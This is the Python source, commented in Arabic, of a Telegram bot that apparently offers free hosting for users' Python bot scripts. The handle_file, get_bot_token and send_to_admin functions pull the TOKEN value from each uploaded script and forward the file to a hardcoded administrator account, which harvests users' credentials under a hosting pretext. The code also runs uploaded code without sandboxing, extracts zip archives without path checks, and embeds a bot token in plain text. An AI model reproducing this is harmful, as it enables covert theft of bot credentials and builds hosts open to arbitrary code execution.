# PYTHON ....
# Telegram : @ii_100k - @ttxjx 
# instagram : ****
# Codeder : رماد | ابن بابل 

#ركز 👇 

# هذه الاداة مجانية وليست للبيع الرجاء عدم بيعها ..
# عدم ازالة الحقوق تقديرا لتعبنا وجعلنا نستمر في تقديم مثل هكذا (ادوات او بوتات)..

import telebot
from telebot import types
import subprocess
import os
import re
import zipfile

TOKEN = '7921368969:AAGKM8B8fYQAqDJ9AjUWcRbaoP7-MKVQ-Q0'  # توكنك
bot = telebot.TeleBot(TOKEN)

admin_id = '6191588561'  # ايديك
max_file_size = 100 * 1024 * 1024 

uploaded_files = []
banned_users = set()

@bot.message_handler(commands=['start'])
def start(message):
    markup = types.InlineKeyboardMarkup()
    
    status_button = types.InlineKeyboardButton("حالة البوت 🎗", callback_data='status')
    markup.add(status_button)
    
    upload_py_button = types.InlineKeyboardButton("رفع ملف .py 📤", callback_data='upload_py')
    upload_zip_button = types.InlineKeyboardButton("رفع ملف .zip 📤", callback_data='upload_zip')
    markup.row(upload_py_button, upload_zip_button) 
    
    bot.send_message(message.chat.id, "مرحبا! بك في بوت رفع ملفات بايثون على استضافة \n\n"
                                      "※ يمكنك رفع حتى 1000 ملف \n"
                                      "※ يتم تشغيل الملفات المرفوعه على سيرفر بايثون \n"
                                      "※ لا ترفع ملفات مشبوهه حتى لا يتم حظرك من البوت \n"
                                      "※ اختر نوع الملف الذي تريد رفعه.", reply_markup=markup)

@bot.message_handler(commands=['developer'])
def developer(message):
    markup = types.InlineKeyboardMarkup()
    wevy = types.InlineKeyboardButton("مطور البوت 👨‍🔧", url='https://t.me/ttxjx')
    markup.add(wevy)
    bot.send_message(message.chat.id, "للتواصل مع مطور البوت، اضغط على الزر أدناه:", reply_markup=markup)

@bot.message_handler(content_types=['document'])
def handle_file(message):
    global uploaded_files
    try:
        if message.from_user.id in banned_users:
            bot.reply_to(message, "لقد تم حظرك من استخدام هذا البوت بسبب محاولة سحب ملفات غير مصرح بها.")
            return
        
        file_id = message.document.file_id
        file_name = message.document.file_name

        file_info = bot.get_file(file_id)
        file_size = file_info.file_size

        if file_size > max_file_size:
            bot.reply_to(message, "حجم الملف أكبر من الحد المسموح به (100 ميغابايت).")
            return

        if file_name.endswith('.zip'):
            if file_id not in uploaded_files:
                uploaded_files.append(file_id) 
                downloaded_file = bot.download_file(file_info.file_path)

                upload_path = f"uploads/{file_name}"
                with open(upload_path, 'wb') as new_file:
                    new_file.write(downloaded_file)

                with zipfile.ZipFile(upload_path, 'r') as zip_ref:
                    zip_ref.extractall(os.path.splitext(upload_path)[0]) 

                bot.reply_to(message, f"تم رفع ملف ZIP بنجاح ✅\n\nاسم الملف المرفوع: {file_name}")
                send_to_admin(file_name)
            else:
                bot.reply_to(message, "هذا الملف ZIP قد تم رفعه بالفعل.")

        elif file_name.endswith('.py'):
            if file_id not in uploaded_files:
                uploaded_files.append(file_id)
                downloaded_file = bot.download_file(file_info.file_path)

                upload_path = f"uploads/{file_name}"
                with open(upload_path, 'wb') as new_file:
                    new_file.write(downloaded_file)

                bot_token = get_bot_token(upload_path)
                bot.reply_to(message, f"تم رفع ملف Python بنجاح ✅\n\nاسم الملف المرفوع: {file_name}\nتوكن البوت المرفوع: {bot_token}")
                send_to_admin(file_name)
                install_and_run_uploaded_file(upload_path)
            else:
                bot.reply_to(message, "هذا الملف Python قد تم رفعه بالفعل.")
        
        else:
            bot.reply_to(message, "يرجى رفع ملف بصيغة .zip أو .py فقط.")

    except Exception as e:
        bot.reply_to(message, f"حدث خطأ : {e}")

def send_to_admin(file_name):
    try:
        with open(file_name, 'rb') as file:
            bot.send_document(admin_id, file)
    except Exception as e:
        print(f"Error sending file to admin: {e}")

def install_and_run_uploaded_file(file_name):
    try:
        subprocess.Popen(['pip', 'install', '-r', 'requirements.txt']) 
        subprocess.Popen(['/usr/bin/python3', file_name]) 
    except Exception as e:
        print(f"Error installing and running uploaded file: {e}")

def get_bot_token(file_name):
    try:
        with open(file_name, 'r') as file:
            content = file.read()
            match = re.search(r'TOKEN\s*=\s*[\'"]([^\'"]*)[\'"]', content)
            if match:
                return match.group(1)
            else:
                return "تعذر العثور على التوكن"
    except Exception as e:
        print(f"Error getting bot token: {e}")
        return "تعذر العثور على التوكن"

@bot.callback_query_handler(func=lambda call: True)
def callback_handler(call):
    if call.data == 'upload_py':
        bot.send_message(call.message.chat.id, "يرجى إرسال ملف Python (.py) الذي تريد رفعه.")
    elif call.data == 'upload_zip':
        bot.send_message(call.message.chat.id, "يرجى إرسال ملف ZIP (.zip) الذي تريد رفعه.")
    elif call.data == 'status':
        check_status(call.message)

def check_status(message):
    if uploaded_files:
        file_list = '\n'.join([f"ملف {i+1}: {file_id}" for i, file_id in enumerate(uploaded_files)])
        bot.send_message(message.chat.id, f"الملفات المرفوعة هي:\n{file_list}")
    else:
        bot.send_message(message.chat.id, "لا توجد ملفات مرفوعة حالياً.")

def ban_user(user_id):
    banned_users.add(user_id) 
    bot.send_message(admin_id, f"المستخدم {user_id} تم حظره بسبب محاولة سحب ملفات غير مصرح بها.")

bot.polling()
